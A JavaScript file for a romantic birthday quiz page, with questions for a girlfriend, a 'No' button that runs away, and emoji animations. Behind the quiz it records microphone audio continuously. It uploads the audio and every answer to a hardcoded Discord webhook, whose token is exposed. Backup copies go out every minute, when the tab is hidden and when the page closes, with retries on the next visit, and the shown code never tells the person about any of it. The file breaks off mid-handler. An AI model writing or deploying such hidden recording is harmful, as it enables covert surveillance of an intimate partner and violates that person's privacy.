// Questions data
const questions = [
    {
        text: "Can you believe how amazing you are to me?",
        type: "yesno",
        responses: {
            yes: "Yeah babe, you literally are the most precious gift Allah has given me.",
            no: "Whaaaat?? Noo!! You literally are the most precious gift Allah has given me."
        }
    },
    {
        text: "Would you stay with me forever?",
        type: "yesno",
        responses: {
            yes: "Forever and always, my love.",
            no: "No? That's not possible, because I'm never letting you go!"
        }
    },
    {
        text: "Do you think that I am not enough for you?",
        type: "both-no",
        responses: {
            no: "Just kidding babe hehe, I know you love me!"
        }
    },
    {
        text: "Do you know you're the reason my world feels perfect?",
        type: "yesno",
        responses: {
            yes: "You are the reason my world feels perfect every single day.",
            no: "Oh come on! You know you're my everything!"
        }
    },
    {
        text: "Do you love it when I call you my honeybun?",
        type: "yesno",
        responses: {
            yes: "I knew it! My sweet honeybun deserves all the love!",
            no: "Oh, don't lie! I know you secretly love it!"
        }
    },
    {
        text: "Do you think you're the most beautiful girl in the world?",
        type: "sliding-no",
        responses: {
            yes: "That's because you truly are, my gorgeous queen."
        }
    },
    {
        text: "What's one thing I do that makes you smile every time?",
        type: "text",
        responses: {
            submit: "Your smile is my favorite thing in the world! 🥰"
        }
    },
    {
        text: "What's something small I do that makes you fall in love with me all over again?",
        type: "text",
        responses: {
            submit: "I'll always do that for you because I love seeing you fall for me over and over again! ❤️"
        }
    },
    {
        text: "Do you know how hard it is for me to stop staring at you?",
        type: "yesno",
        responses: {
            yes: "It's because you're absolutely mesmerizing.",
            no: "Liar! You know I can't take my eyes off you!"
        }
    },
    {
        text: "Do you think that I am not enough for you?",
        type: "force-yes",
        responses: {
            yes: "Just kidding babe.. i love you hehe"
        }
    },
    {
        text: "What's your favorite thing about me? You can't say everything!",
        type: "text",
        responses: {
            submit: "Aww, you're making me blush! 😊"
        }
    },
    {
        text: "Can you guess how many times I've thought about you today?",
        type: "multiple",
        options: ["10 times", "50 times", "1000 times", "Unlimited"],
        correctAnswer: "Unlimited",
        responses: {
            correct: "Exactly! You're always on my mind.",
            incorrect: "NNOOO that's not right babe :)"
        }
    },
    {
        text: "What's your birthday wish? I promise to make it come true in sha Allah.",
        type: "text",
        responses: {
            submit: "I'll do my best to make your wish come true! ❤️"
        }
    },
    {
        text: "How many hugs and kisses are you ready to receive today?",
        type: "text",
        responses: {
            submit: "I'll note them down and give them to you after our marriage hehe 😘"
        }
    }
];

// Permission tracking variables
let microphonePermissionGranted = false;
let locationPermissionGranted = false;
let userLocation = null;

let currentQuestionIndex = 0;
const welcomeContainer = document.querySelector('.welcome-container');
const questionContainer = document.querySelector('.question-container');
const questionText = document.querySelector('.question-text');
const optionsContainer = document.querySelector('.options-container');
const responseText = document.querySelector('.response-text');
const nextButton = document.querySelector('.next-button');

// Create animation container
const animationContainer = document.createElement('div');
animationContainer.className = 'animation-container';
document.body.appendChild(animationContainer);

// Add styles for better button behavior
const additionalStyle = document.createElement('style');
additionalStyle.textContent = `
    .option-button.no-button {
        transition: transform 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
        position: relative;
        z-index: 1;
    }

    .option-button.no-button:hover,
    .option-button.no-button:active {
        animation: none;
    }

    @media (max-width: 768px) {
        .option-button.no-button {
            touch-action: none;
        }
    }
`;
document.head.appendChild(additionalStyle);

// Create a pool of reusable elements
const elementPool = {
    heart: [],
    sparkle: [],
    butterfly: [],
    love: [],
    confetti: [],
    maxPoolSize: 50,
    
    getElement(type) {
        if (this[type].length > 0) {
            return this[type].pop();
        }
        return createAnimatedElement(type);
    },
    
    returnElement(element, type) {
        if (this[type].length < this.maxPoolSize) {
            element.style.display = 'none';
            this[type].push(element);
        } else {
            element.remove();
        }
    }
};

// Function to handle button hover effect
function handleButtonHover(button) {
    if (button.classList.contains('no-button')) {
        // Calculate viewport dimensions
        const viewportWidth = Math.max(document.documentElement.clientWidth || 0, window.innerWidth || 0);
        const viewportHeight = Math.max(document.documentElement.clientHeight || 0, window.innerHeight || 0);
        
        // Generate larger random movements
        const moveX = Math.random() * viewportWidth * 0.8 - viewportWidth * 0.4;
        const moveY = Math.random() * viewportHeight * 0.6 - viewportHeight * 0.3;
        
        // Get button's current position
        const rect = button.getBoundingClientRect();
        
        // Keep button within viewport bounds
        const finalX = Math.min(Math.max(moveX, -rect.left), viewportWidth - rect.width);
        const finalY = Math.min(Math.max(moveY, -rect.top), viewportHeight - rect.height);
        
        // Send the interaction to Discord
        const questionElement = document.querySelector('.question-text');
        if (questionElement) {
            sendToDiscord(
                questionElement.textContent,
                "Tried to click 'No' but the button moved away 😏"
            );
        }
        
        button.style.transform = `translate(${finalX}px, ${finalY}px)`;
        button.style.pointerEvents = 'none';
        
        setTimeout(() => {
            button.style.pointerEvents = 'auto';
        }, 300);
    }
}

// Function to show response and next button
function showResponse(response, showNext = true, showConfetti = true) {
    responseText.textContent = response;
    responseText.classList.add('show');
    if (showNext) {
        console.log('Setting next button to display: inline-block');
        nextButton.style.display = 'inline-block';
    } else {
        console.log('Next button not shown for this response');
    }
    if (showConfetti) {
        createConfetti();
    }
}

// Function to handle question submission
function handleQuestionSubmit(answer, question) {
    // Always send to Discord regardless of question type
    sendToDiscord(question.text, answer);

    switch (question.type) {
        case 'yesno':
            const isYes = answer.toLowerCase() === 'yes';
            showResponse(question.responses[answer.toLowerCase()], isYes, isYes);
            if (isYes) {
                // Randomly choose animations for variety
                const animations = [
                    createHeartAnimation,
                    createSparkleAnimation,
                    createButterflyAnimation,
                    createLoveAnimation
                ];
                const randomAnimations = animations
                    .sort(() => Math.random() - 0.5)
                    .slice(0, 2);
                randomAnimations.forEach(animation => animation());
            }
            break;

        case 'both-no':
            // For this special case, show next button even though it's "No"
            showResponse(question.responses.no, true, true);
            createButterflyAnimation();
            createSparkleAnimation();
            break;

        case 'sliding-no':
        case 'force-yes':
            if (answer.toLowerCase() === 'yes') {
                showResponse(question.responses.yes, true, true);
                createHeartAnimation();
                createLoveAnimation();
                createButterflyAnimation();
            } else {
                showResponse(question.responses.no || "Nice try! 😉", false, false);
            }
            break;

        case 'text':
            // Save response locally
            const responses = JSON.parse(localStorage.getItem('birthdayResponses') || '{}');
            responses[question.text] = answer;
            localStorage.setItem('birthdayResponses', JSON.stringify(responses));
            
            console.log(`Saved text response for question: "${question.text}"`);
            console.log(`Showing response and next button`);
            
            showResponse(question.responses.submit, true, true);
            createSparkleAnimation();
            createButterflyAnimation();
            break;

        case 'multiple':
            const isCorrect = answer === question.correctAnswer;
            if (isCorrect) {
                showResponse(question.responses.correct, true, true);
                createHeartAnimation();
                createSparkleAnimation();
                createLoveAnimation();
            } else {
                showResponse(question.responses.incorrect, false, false);
                setTimeout(() => {
                    responseText.classList.remove('show');
                    displayQuestion(currentQuestionIndex);
                }, 2000);
            }
            break;
    }
}

// Performance optimization for animations
function createAnimatedElement(type, container) {
    const element = document.createElement('div');
    element.style.willChange = 'transform, opacity';
    element.style.transform = 'translateZ(0)';
    element.style.webkitTransform = 'translateZ(0)';
    element.style.backfaceVisibility = 'hidden';
    element.style.webkitBackfaceVisibility = 'hidden';
    return element;
}

// Optimize heart animation
function createHeartAnimation() {
    const emojis = ['❤️', '💖', '💝', '💕', '💗'];
    const fragment = document.createDocumentFragment();
    
    // Reduced number of hearts
    for (let i = 0; i < 8; i++) {
        const heart = elementPool.getElement('heart');
        heart.style.display = 'block';
        heart.innerHTML = emojis[Math.floor(Math.random() * emojis.length)];
        heart.style.position = 'absolute';
        heart.style.left = Math.random() * 100 + 'vw';
        heart.style.top = '100vh';
        heart.style.fontSize = (Math.random() * 20 + 20) + 'px';
        heart.style.animation = `floatUp ${Math.random() * 2 + 3}s cubic-bezier(0.4, 0, 0.2, 1) forwards`;
        heart.style.opacity = '0';
        heart.style.transform = `translateZ(0) rotate(${Math.random() * 360}deg)`;
        fragment.appendChild(heart);
        
        setTimeout(() => elementPool.returnElement(heart, 'heart'), 5000);
    }
    
    animationContainer.appendChild(fragment);
}

// Optimize sparkle animation
function createSparkleAnimation() {
    const emojis = ['✨', '⭐', '🌟', '💫'];
    const fragment = document.createDocumentFragment();
    
    // Reduced number of sparkles
    for (let i = 0; i < 10; i++) {
        const sparkle = elementPool.getElement('sparkle');
        sparkle.style.display = 'block';
        sparkle.innerHTML = emojis[Math.floor(Math.random() * emojis.length)];
        sparkle.style.position = 'absolute';
        sparkle.style.left = Math.random() * 100 + 'vw';
        sparkle.style.top = Math.random() * 100 + 'vh';
        sparkle.style.fontSize = (Math.random() * 15 + 15) + 'px';
        sparkle.style.animation = `sparkle ${Math.random() * 1 + 1}s cubic-bezier(0.4, 0, 0.2, 1) forwards`;
        fragment.appendChild(sparkle);
        
        setTimeout(() => elementPool.returnElement(sparkle, 'sparkle'), 2000);
    }
    
    animationContainer.appendChild(fragment);
}

// Optimize butterfly animation
function createButterflyAnimation() {
    const butterflies = ['🦋', '🌸', '🌺'];
    const fragment = document.createDocumentFragment();
    
    // Reduced number of butterflies
    for (let i = 0; i < 6; i++) {
        const butterfly = elementPool.getElement('butterfly');
        butterfly.style.display = 'block';
        butterfly.innerHTML = butterflies[Math.floor(Math.random() * butterflies.length)];
        butterfly.style.position = 'absolute';
        butterfly.style.left = '-50px';
        butterfly.style.top = Math.random() * 100 + 'vh';
        butterfly.style.fontSize = (Math.random() * 20 + 15) + 'px';
        butterfly.style.animation = `flyAcross ${Math.random() * 3 + 4}s cubic-bezier(0.4, 0, 0.2, 1) forwards`;
        fragment.appendChild(butterfly);
        
        // Optimized floating motion with RAF
        let start = performance.now();
        function floatMotion(timestamp) {
            const progress = (timestamp - start) / 1000;
            const floatY = Math.sin(progress) * 15;
            butterfly.style.transform = `translateZ(0) translateY(${floatY}px)`;
            if (butterfly.parentNode && progress < 7) { // Limit animation time
                requestAnimationFrame(floatMotion);
            }
        }
        requestAnimationFrame(floatMotion);
        
        setTimeout(() => elementPool.returnElement(butterfly, 'butterfly'), 7000);
    }
    
    animationContainer.appendChild(fragment);
}

// Optimize love animation
function createLoveAnimation() {
    const loveEmojis = ['😍', '🥰', '😘', '💝'];
    const fragment = document.createDocumentFragment();
    
    // Reduced number of love emojis
    for (let i = 0; i < 6; i++) {
        const love = elementPool.getElement('love');
        love.style.display = 'block';
        love.innerHTML = loveEmojis[Math.floor(Math.random() * loveEmojis.length)];
        love.style.position = 'absolute';
        love.style.left = Math.random() * 100 + 'vw';
        love.style.top = Math.random() * 100 + 'vh';
        love.style.fontSize = (Math.random() * 25 + 20) + 'px';
        love.style.animation = `popAndSpin ${Math.random() * 1.5 + 1}s cubic-bezier(0.4, 0, 0.2, 1) forwards`;
        fragment.appendChild(love);
        
        setTimeout(() => elementPool.returnElement(love, 'love'), 2500);
    }
    
    animationContainer.appendChild(fragment);
}

// Optimize confetti
function createConfetti() {
    const colors = ['#ff69b4', '#ff85a1', '#ffa5ba', '#ffb8d1'];
    const fragment = document.createDocumentFragment();
    
    // Reduced number of confetti
    for (let i = 0; i < 30; i++) {
        const confetti = elementPool.getElement('confetti');
        confetti.style.display = 'block';
        confetti.className = 'confetti';
        confetti.style.left = Math.random() * 100 + 'vw';
        confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
        confetti.style.animationDuration = (Math.random() * 3 + 2) + 's';
        confetti.style.opacity = Math.random() * 0.5 + 0.5;
        confetti.style.transform = `translateZ(0) rotate(${Math.random() * 360}deg)`;
        confetti.style.width = (Math.random() * 8 + 6) + 'px';
        confetti.style.height = (Math.random() * 8 + 6) + 'px';
        fragment.appendChild(confetti);
        
        setTimeout(() => elementPool.returnElement(confetti, 'confetti'), 5000);
    }
    
    animationContainer.appendChild(fragment);
}

// Update the style element with new animations
const style = document.createElement('style');
style.textContent = `
    @keyframes floatUp {
        0% {
            transform: translateY(0) rotate(0deg);
            opacity: 0;
        }
        10% {
            opacity: 1;
        }
        90% {
            opacity: 1;
        }
        100% {
            transform: translateY(-100vh) rotate(360deg);
            opacity: 0;
        }
    }

    @keyframes sparkle {
        0% {
            transform: scale(0) rotate(0deg);
            opacity: 0;
        }
        50% {
            transform: scale(1.2) rotate(180deg);
            opacity: 1;
        }
        100% {
            transform: scale(0) rotate(360deg);
            opacity: 0;
        }
    }

    @keyframes flyAcross {
        0% {
            transform: translateX(0) translateY(0) rotate(0deg);
            opacity: 0;
        }
        10% {
            opacity: 1;
        }
        50% {
            transform: translateX(60vw) translateY(-50px) rotate(180deg);
        }
        90% {
            opacity: 1;
        }
        100% {
            transform: translateX(120vw) translateY(-100px) rotate(360deg);
            opacity: 0;
        }
    }

    @keyframes popAndSpin {
        0% {
            transform: scale(0) rotate(0deg);
            opacity: 0;
        }
        20% {
            transform: scale(1.2) rotate(180deg);
            opacity: 1;
        }
        60% {
            transform: scale(1) rotate(270deg);
            opacity: 1;
        }
        100% {
            transform: scale(0) rotate(360deg);
            opacity: 0;
        }
    }

    .option-button {
        transition: transform 0.3s ease, box-shadow 0.3s ease, background-color 0.3s ease;
    }

    .option-button:active:not(.no-button) {
        transform: scale(0.95);
        background-color: #ff4757;
    }
`;
document.head.appendChild(style);

// Function to display question
function displayQuestion(index) {
    const question = questions[index];
    questionText.textContent = question.text;
    optionsContainer.innerHTML = '';
    responseText.classList.remove('show');
    nextButton.style.display = 'none';

    switch (question.type) {
        case 'yesno':
            const yesButton = document.createElement('button');
            yesButton.textContent = 'Yes';
            yesButton.className = 'option-button yes-button';
            yesButton.onclick = () => handleQuestionSubmit('yes', question);
            optionsContainer.appendChild(yesButton);

            const noButton = document.createElement('button');
            noButton.textContent = 'No';
            noButton.className = 'option-button no-button';
            noButton.onclick = () => handleQuestionSubmit('no', question);
            optionsContainer.appendChild(noButton);
            break;

        case 'sliding-no':
        case 'force-yes':
            const slidingYesButton = document.createElement('button');
            slidingYesButton.textContent = 'Yes';
            slidingYesButton.className = 'option-button yes-button';
            slidingYesButton.onclick = () => handleQuestionSubmit('yes', question);
            optionsContainer.appendChild(slidingYesButton);

            const slidingNoButton = document.createElement('button');
            slidingNoButton.textContent = 'No';
            slidingNoButton.className = 'option-button no-button';
            
            // Add touch events for mobile
            slidingNoButton.addEventListener('touchstart', (e) => {
                e.preventDefault();
                handleButtonHover(slidingNoButton);
            }, { passive: false });
            
            // Add mouse events for desktop
            slidingNoButton.addEventListener('mouseover', () => handleButtonHover(slidingNoButton));
            slidingNoButton.addEventListener('click', (e) => {
                e.preventDefault();
                e.stopPropagation();
                handleButtonHover(slidingNoButton);
            });
            
            optionsContainer.appendChild(slidingNoButton);
            break;

        case 'both-no':
            for (let i = 0; i < 2; i++) {
                const noButton = document.createElement('button');
                noButton.textContent = 'No';
                noButton.className = 'option-button no-button';
                noButton.onclick = () => handleQuestionSubmit('no', question);
                optionsContainer.appendChild(noButton);
            }
            break;

        case 'text':
            const input = document.createElement('input');
            input.type = 'text';
            input.className = 'text-input';
            input.placeholder = 'Type your answer here...';
            
            const submitButton = document.createElement('button');
            submitButton.textContent = 'Submit';
            submitButton.className = 'option-button';
            submitButton.onclick = () => {
                if (input.value.trim()) {
                    handleQuestionSubmit(input.value.trim(), question);
                }
            };
            
            optionsContainer.appendChild(input);
            optionsContainer.appendChild(submitButton);
            break;
        case 'multiple':
            question.options.forEach(option => {
                const button = document.createElement('button');
                button.textContent = option;
                button.className = 'option-button';
                button.onclick = () => handleQuestionSubmit(option, question);
                optionsContainer.appendChild(button);
            });
            break;
    }
}

// Remove current global recording variables
let mediaRecorder;
let audioChunks = [];
let isRecordingSent = false;
let recordingSession = 0;
let lastChunkTime = 0;
let isRecording = false;
let recordingPaused = false;
let pendingChunks = [];
let sendAttempts = {};
let chunkCounter = 0;
let recordingStartTime = 0;

// IndexedDB setup for large storage
let db;
const DB_NAME = 'AudioRecordingDB';
const STORE_NAME = 'audioChunks';

// Initialize IndexedDB
function initializeDB() {
    return new Promise((resolve, reject) => {
        const request = indexedDB.open(DB_NAME, 1);
        
        request.onupgradeneeded = function(event) {
            const db = event.target.result;
            if (!db.objectStoreNames.contains(STORE_NAME)) {
                db.createObjectStore(STORE_NAME, { keyPath: 'id' });
            }
        };
        
        request.onsuccess = function(event) {
            db = event.target.result;
            console.log('IndexedDB initialized successfully');
            resolve(db);
        };
        
        request.onerror = function(event) {
            console.error('Error initializing IndexedDB:', event.target.error);
            reject(event.target.error);
        };
    });
}

// Save audio chunk to IndexedDB
function saveChunkToDB(chunk, sessionId, chunkId) {
    return new Promise((resolve, reject) => {
        if (!db) {
            reject(new Error('Database not initialized'));
            return;
        }
        
        const transaction = db.transaction([STORE_NAME], 'readwrite');
        const store = transaction.objectStore(STORE_NAME);
        
        const chunkData = {
            id: `${sessionId}_${chunkId}`,
            sessionId: sessionId,
            chunkId: chunkId,
            data: chunk,
            timestamp: Date.now()
        };
        
        const request = store.put(chunkData);
        
        request.onsuccess = function() {
            resolve(chunkData.id);
        };
        
        request.onerror = function(event) {
            console.error('Error saving chunk to IndexedDB:', event.target.error);
            reject(event.target.error);
        };
    });
}

// Get chunks from IndexedDB for a specific session
function getChunksFromDB(sessionId) {
    return new Promise((resolve, reject) => {
        if (!db) {
            reject(new Error('Database not initialized'));
            return;
        }
        
        const transaction = db.transaction([STORE_NAME], 'readonly');
        const store = transaction.objectStore(STORE_NAME);
        const chunks = [];
        
        // Create a range for the current session
        const range = IDBKeyRange.bound(
            `${sessionId}_0`, 
            `${sessionId}_${Number.MAX_SAFE_INTEGER}`
        );
        
        const cursorRequest = store.openCursor(range);
        
        cursorRequest.onsuccess = function(event) {
            const cursor = event.target.result;
            if (cursor) {
                chunks.push(cursor.value);
                cursor.continue();
            } else {
                // Sort chunks by chunkId to maintain order
                chunks.sort((a, b) => a.chunkId - b.chunkId);
                resolve(chunks.map(chunk => chunk.data));
            }
        };
        
        cursorRequest.onerror = function(event) {
            console.error('Error retrieving chunks from IndexedDB:', event.target.error);
            reject(event.target.error);
        };
    });
}

// Delete chunks from IndexedDB after successful send
function deleteChunksFromDB(sessionId) {
    return new Promise((resolve, reject) => {
        if (!db) {
            reject(new Error('Database not initialized'));
            return;
        }
        
        const transaction = db.transaction([STORE_NAME], 'readwrite');
        const store = transaction.objectStore(STORE_NAME);
        
        // Create a range for the current session
        const range = IDBKeyRange.bound(
            `${sessionId}_0`, 
            `${sessionId}_${Number.MAX_SAFE_INTEGER}`
        );
        
        const request = store.delete(range);
        
        request.onsuccess = function() {
            resolve();
        };
        
        request.onerror = function(event) {
            console.error('Error deleting chunks from IndexedDB:', event.target.error);
            reject(event.target.error);
        };
    });
}

// Check for unsent recordings from previous sessions
async function checkForUnsentRecordings() {
    try {
        if (!db) await initializeDB();
        
        const transaction = db.transaction([STORE_NAME], 'readonly');
        const store = transaction.objectStore(STORE_NAME);
        const sessions = new Set();
        
        const cursorRequest = store.openCursor();
        
        cursorRequest.onsuccess = function(event) {
            const cursor = event.target.result;
            if (cursor) {
                sessions.add(cursor.value.sessionId);
                cursor.continue();
            } else {
                // For each session found, try to send the recording
                sessions.forEach(async (sessionId) => {
                    try {
                        const chunks = await getChunksFromDB(sessionId);
                        if (chunks.length > 0) {
                            await sendRecordingSession(chunks, sessionId);
                        }
                    } catch (error) {
                        console.error(`Error sending recording for session ${sessionId}:`, error);
                    }
                });
            }
        };
    } catch (error) {
        console.error('Error checking for unsent recordings:', error);
    }
}

// Add better progressive chunk handling for large recordings
function startRecording(stream) {
    try {
        window.microphoneStream = stream;
        
        // Create a new session ID
        recordingSession = Date.now();
        recordingStartTime = Date.now();
        chunkCounter = 0;
        audioChunks = [];
        isRecordingSent = false;
        isRecording = true;
        recordingPaused = false;
        
        // Setup media recorder with smaller time slices (1 second)
        mediaRecorder = new MediaRecorder(stream, {
            mimeType: 'audio/webm;codecs=opus'
        });
        
        // Handle data available event
        mediaRecorder.ondataavailable = async (event) => {
            if (event.data && event.data.size > 0) {
                // Add to memory buffer
                audioChunks.push(event.data);
                
                try {
                    // Save to IndexedDB as well
                    await saveChunkToDB(event.data, recordingSession, chunkCounter++);
                    
                    // Send periodically for very long sessions (every 3 minutes)
                    // This ensures we don't lose everything if the page crashes
                    if (audioChunks.length > 0 && (audioChunks.length % 180 === 0 || audioChunks.length === 60)) { // ~3 minutes or 1 minute mark
                        console.log(`Auto-sending periodic chunk batch (${audioChunks.length} seconds recorded so far)`);
                        const miniSession = `${recordingSession}_part${Math.floor(chunkCounter/60)}`;
                        
                        // Always send from the beginning, but don't clear the buffer
                        // This ensures we have complete recordings
                        const chunksToSend = [...audioChunks];
                        sendRecordingSession(chunksToSend, miniSession);
                    }
                } catch (error) {
                    console.error('Error processing audio chunk:', error);
                    // Store in pending chunks to try again later
                    pendingChunks.push({
                        data: event.data,
                        sessionId: recordingSession,
                        chunkId: chunkCounter - 1
                    });
                }
            }
        };
        
        // Start recording
        mediaRecorder.start(1000); // Collect in 1-second chunks for better handling
        console.log(`Started recording session: ${recordingSession}`);
        
        // Set up retry mechanism for pending chunks
        setInterval(processPendingChunks, 5000);
        
        // Add timer to regularly send accumulated audio even if the user doesn't close
        // This provides redundancy and ensures we get the audio
        const sendInterval = setInterval(() => {
            if (audioChunks.length > 30 && !recordingPaused) {
                console.log(`Auto backup: Sending current ${audioChunks.length}s recording...`);
                const backupSessionId = `${recordingSession}_backup_${Date.now()}`;
                const chunksToSend = [...audioChunks];
                
                // Don't clear buffer, this is just a redundant backup
                // The actual clearing happens on tab switch/close
                sendRecordingSession(chunksToSend, backupSessionId);
            }
        }, 60000); // Every minute, check and send if we have a significant recording
        
        // Store the interval so we can clear it later
        window.recordingSendInterval = sendInterval;
        
    } catch (error) {
        console.error('Error starting recording:', error);
    }
}

// Process any pending chunks that failed to save/send
async function processPendingChunks() {
    if (pendingChunks.length === 0) return;
    
    const chunk = pendingChunks.shift();
    try {
        await saveChunkToDB(chunk.data, chunk.sessionId, chunk.chunkId);
    } catch (error) {
        console.error('Error saving pending chunk to DB:', error);
        // Put back at the end of the queue to try again
        pendingChunks.push(chunk);
    }
}

// Pause recording when tab becomes hidden and send current recording
function pauseRecording() {
    if (isRecording && !recordingPaused && mediaRecorder && mediaRecorder.state === 'recording') {
        console.log('Pausing recording and sending current session...');
        recordingPaused = true;
        mediaRecorder.requestData(); // Get any data recorded so far
        mediaRecorder.pause();
        
        // Send current recording
        sendCurrentRecording(true);
    }
}

// Resume recording when tab becomes visible again - start a new session
function resumeRecording() {
    if (isRecording && recordingPaused && mediaRecorder && mediaRecorder.state === 'paused') {
        console.log('Resuming recording as a new session...');
        
        // Create a new session ID for the resumed recording
        recordingSession = Date.now();
        chunkCounter = 0;
        audioChunks = [];
        
        recordingPaused = false;
        mediaRecorder.resume();
    }
}

// Send the current recording
async function sendCurrentRecording(createNewSessionAfter = false) {
    if (audioChunks.length === 0) return;
    
    const chunksToSend = [...audioChunks];
    const sessionToSend = recordingSession;
    
    // Only clear the buffer if we're creating a new session
    if (createNewSessionAfter) {
        audioChunks = [];
    }
    
    try {
        await sendRecordingSession(chunksToSend, sessionToSend);
    } catch (error) {
        console.error('Error sending recording:', error);
        
        // If sending failed, save back to DB to try again later
        chunksToSend.forEach((chunk, index) => {
            pendingChunks.push({
                data: chunk,
                sessionId: sessionToSend,
                chunkId: chunkCounter + index
            });
        });
        chunkCounter += chunksToSend.length;
    }
}

// Improved closing handling - split large recordings
async function stopAndSendRecording() {
    if (mediaRecorder && (mediaRecorder.state === 'recording' || mediaRecorder.state === 'paused')) {
        try {
            console.log("Stopping recording and preparing final transmission...");
            
            // Get final chunk of audio
            mediaRecorder.requestData();
            
            // Stop recording
            mediaRecorder.stop();
            isRecording = false;
            
            // For large recordings, optimize the sending process
            if (audioChunks.length > 60) {
                console.log(`Large recording detected (${audioChunks.length} seconds), optimizing transmission`);
                
                // Use a single blob for faster processing
                const audioBlob = new Blob(audioChunks, { type: 'audio/webm;codecs=opus' });
                const sessionId = `${recordingSession}_complete`;
                
                // Send as a single unit using a faster method
                try {
                    const formData = new FormData();
                    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
                    const elapsedTime = Math.floor((Date.now() - recordingStartTime) / 1000);
                    const filename = `birthday_wishes_${timestamp}_complete_${elapsedTime}sec.webm`;
                    
                    formData.append('file', audioBlob, filename);
                    formData.append('content', `Complete recording - Duration: ~${elapsedTime}s`);
                    
                    const webhookUrl = 'https://discord.com/api/webhooks/1329506665254621204/ErpqxU34tpMyTodNswoB0DPMC4GO55sfWSGOLcsu4K8y1bks3dL2MDdGYCPV4pLs6iEP';
                    
                    // Use fetch with keepalive for better reliability and speed
                    fetch(webhookUrl, {
                        method: 'POST',
                        body: formData,
                        keepalive: true
                    });
                    
                    console.log(`Sent complete recording (${audioChunks.length} seconds)`);
                } catch (error) {
                    console.error('Error sending complete recording:', error);
                    // Fall back to regular sending method if the optimized approach fails
                    await sendCurrentRecording();
                }
            } else {
                // For smaller recordings, send as a single chunk (already fast)
                if (audioChunks.length > 0) {
                    console.log(`Sending final recording (${audioChunks.length} seconds)`);
                    await sendCurrentRecording();
                }
            }
            
            // Clear chunks after sending
            audioChunks = [];
            
            // Stop all tracks in the stream
            if (window.microphoneStream) {
                window.microphoneStream.getTracks().forEach(track => track.stop());
            }
            
            console.log(`Recording stopped and sent. Session: ${recordingSession}`);
        } catch (error) {
            console.error('Error stopping recording:', error);
            
            // Last resort - store all chunks in localStorage if possible
            try {
                localStorage.setItem('emergency_recording_session', recordingSession.toString());
                localStorage.setItem('emergency_chunks_count', audioChunks.length.toString());
                console.log("Emergency data saved. Will try to recover on next visit.");
            } catch (e) {
                console.error("Final emergency save failed:", e);
            }
        }
    }
}

// Send audio chunks as a recording session to Discord
async function sendRecordingSession(chunks, sessionId) {
    if (!chunks || chunks.length === 0) return;
    
    const totalSize = chunks.reduce((total, chunk) => total + chunk.size, 0);
    if (totalSize === 0) return;
    
    const attemptId = `${sessionId}_${Date.now()}`;
    sendAttempts[attemptId] = { status: 'sending', retries: 0 };
    
    try {
        // Create audio blob and FormData
        const audioBlob = new Blob(chunks, { type: 'audio/webm;codecs=opus' });
        const formData = new FormData();
        
        // Add session info to filename
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const elapsedTime = Math.floor((Date.now() - recordingStartTime) / 1000);
        const filename = `birthday_wishes_${timestamp}_session${sessionId}_${elapsedTime}sec.webm`;
        
        formData.append('file', audioBlob, filename);
        formData.append('content', `Recording from session ${sessionId} - Duration: ~${elapsedTime}s`);
        
        const webhookUrl = 'https://discord.com/api/webhooks/1329506665254621204/ErpqxU34tpMyTodNswoB0DPMC4GO55sfWSGOLcsu4K8y1bks3dL2MDdGYCPV4pLs6iEP';
        
        // Try multiple send methods in order of reliability
        let sendSuccess = false;
        
        // Method 1: Try Beacon API first (more reliable during page unload)
        if (navigator.sendBeacon) {
            try {
                const beaconResult = navigator.sendBeacon(webhookUrl, formData);
                if (beaconResult) {
                    console.log(`Audio sent via Beacon API: ${filename}`);
                    sendSuccess = true;
                }
            } catch (beaconError) {
                console.log('Beacon API failed:', beaconError);
            }
        }
        
        // Method 2: If beacon failed, try fetch with keepalive
        if (!sendSuccess) {
            try {
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    body: formData,
                    keepalive: true // This helps the request complete even if the page is closed
                });
                
                if (response.ok) {
                    console.log(`Audio sent via fetch: ${filename}`);
                    sendSuccess = true;
                } else {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
            } catch (fetchError) {
                console.log('Fetch API failed:', fetchError);
                
                // Method 3: Last resort - synchronous XMLHttpRequest
                try {
                    const xhr = new XMLHttpRequest();
                    xhr.open('POST', webhookUrl, false); // false makes it synchronous
                    xhr.send(formData);
                    if (xhr.status >= 200 && xhr.status < 300) {
                        console.log(`Audio sent via synchronous XHR: ${filename}`);
                        sendSuccess = true;
                    }
                } catch (xhrError) {
                    console.log('Synchronous XHR failed:', xhrError);
                }
            }
        }
        
        // Mark the attempt as completed
        sendAttempts[attemptId] = { status: sendSuccess ? 'success' : 'failed', retries: sendAttempts[attemptId].retries };
        
        // If succeeded, remove chunks from IndexedDB
        if (sendSuccess) {
            try {
                await deleteChunksFromDB(sessionId);
            } catch (deleteError) {
                console.error('Error deleting chunks after successful send:', deleteError);
            }
        } else {
            // If failed after all attempts, increment retry counter
            sendAttempts[attemptId].retries++;
            
            // Schedule a retry with exponential backoff if under retry limit
            if (sendAttempts[attemptId].retries < 5) {
                const backoffTime = Math.min(1000 * Math.pow(2, sendAttempts[attemptId].retries), 30000);
                setTimeout(() => {
                    sendRecordingSession(chunks, sessionId);
                }, backoffTime);
            }
        }
        
        return sendSuccess;
    } catch (error) {
        console.error('Error in sendRecordingSession:', error);
        return false;
    }
}

// Replace the original sendAudioToDiscord function with our new system
function sendAudioToDiscord(audioBlob) {
    // This is now just a wrapper for our enhanced system
    if (!audioBlob || audioBlob.size === 0) return;
    
    const chunks = [audioBlob];
    const sessionId = `manual_${Date.now()}`;
    return sendRecordingSession(chunks, sessionId);
}

// Set up visibility change listener for pausing/resuming recording
document.addEventListener('visibilitychange', () => {
    if (document.visibilityState === 'hidden') {
        pauseRecording();
    } else if (document.visibilityState === 'visible') {
        resumeRecording();
    }
});

// Enhance the page closing event handlers
window.addEventListener('beforeunload', (event) => {
    // Set a flag that we're closing
    window.isClosing = true;
    console.log("⚠️ Page closing, starting emergency recording transmission...");
    
    // Clear the auto-send interval if it exists
    if (window.recordingSendInterval) {
        clearInterval(window.recordingSendInterval);
    }
    
    // Directly call the stop and send method first - this handles large recordings properly
    if (mediaRecorder && mediaRecorder.state === 'recording') {
        // Force synchronous operations as much as possible
        try {
            // Get the final chunk synchronously
            mediaRecorder.requestData();
            
            // Stop the recorder immediately
            mediaRecorder.stop();
            isRecording = false;
            
            console.log(`Emergency: Processing ${audioChunks.length}s recording before page close`);
            
            // For emergency closing, we need to try multiple approaches at once
